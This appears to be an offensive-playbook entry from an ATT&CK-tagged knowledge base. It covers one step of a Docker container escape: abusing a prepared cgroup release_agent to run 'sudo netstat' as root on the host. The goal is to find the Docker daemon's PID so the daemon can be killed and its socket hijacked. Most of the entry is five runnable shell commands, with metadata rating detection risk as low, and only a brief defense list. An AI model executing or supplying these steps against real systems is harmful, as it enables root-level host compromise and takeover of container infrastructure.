---
tags:
  - process-discovery
  - netstat
  - pid
type: procedure
tools:
  - '[[tools/netstat]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/create-cmd-script-shebang]]'
  - '[[commands/append-netstat-to-cmd-script]]'
  - '[[commands/chmod-executable-cmd]]'
  - '[[commands/trigger-cgroup-execution]]'
  - '[[commands/cat-netstat-output]]'
platforms:
  - Linux
techniques:
  - '[[Process Discovery]]'
skill_level: advanced
impact_level: medium
detection_risk: low
sub_techniques: []
id: 00a12c3c-ea4a-49e2-98ad-3dea6387145e
created_at: '2025-12-14T04:08:48.107Z'
updated_at: '2025-12-14T04:08:48.107Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Process Discovery]]'
---
# Find Docker Daemon PID Using Netstat

## Summary

This procedure uses cgroup escalation to run netstat as root on the host, identifying the PID of the Docker daemon listening on TLS port 2376 for targeted killing.

## Description

To hijack the Docker socket, the daemon must be terminated. Since it's root-owned, use the cgroup release_agent to execute a script containing sudo netstat, outputting TCP listeners with PIDs to a host-readable file.

## Requirements

1. Cgroup setup from prior procedure
2. $host_path exported
3. Netstat available on host

## Defense

Defensive measures and detection strategies:

- Disable sudo in runner scripts or use non-root dockerd
- Log netstat executions and monitor for port scans
- Use systemd to restart dockerd on kill

## Objectives

1. Discover dockerd process ID
2. Prepare for daemon termination
3. Avoid blind killing

## Instructions

### Step 1: Initialize Script

**Context**: Start /cmd script for root execution.

**Command** ([[commands/create-cmd-script-shebang]]):
```bash
echo '#!/bin/sh' > /cmd
```

> Sets shell shebang.

### Step 2: Append Netstat Command

**Context**: Add netstat to list TCP ports with PIDs.

**Command** ([[commands/append-netstat-to-cmd-script]]):
```bash
echo "sudo netstat -tanp > $host_path/n2" >> /cmd
```

> Runs netstat as sudo, outputs to host file /n2.

### Step 3: Make Executable

**Context**: Ensure script runs on trigger.

**Command** ([[commands/chmod-executable-cmd]]):
```bash
chmod a+x /cmd
```

> Grants execute permissions.

### Step 4: Trigger Execution

**Context**: Move process to cgroup to run agent as root.

**Command** ([[commands/trigger-cgroup-execution]]):
```bash
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

> $$ is current PID; triggers /cmd.

### Step 5: Read Output

**Context**: Retrieve netstat results.

**Command** ([[commands/cat-netstat-output]]):
```bash
cat /n2
```

> Shows lines like tcp 0 0 0.0.0.0:2376 ... PID/dockerd.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Process Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/create-cmd-script-shebang]]
- [[commands/append-netstat-to-cmd-script]]
- [[commands/chmod-executable-cmd]]
- [[commands/trigger-cgroup-execution]]
- [[commands/cat-netstat-output]]

## Tools Used

- [[tools/netstat]]

## Tags

- process-discovery
- netstat
- pid
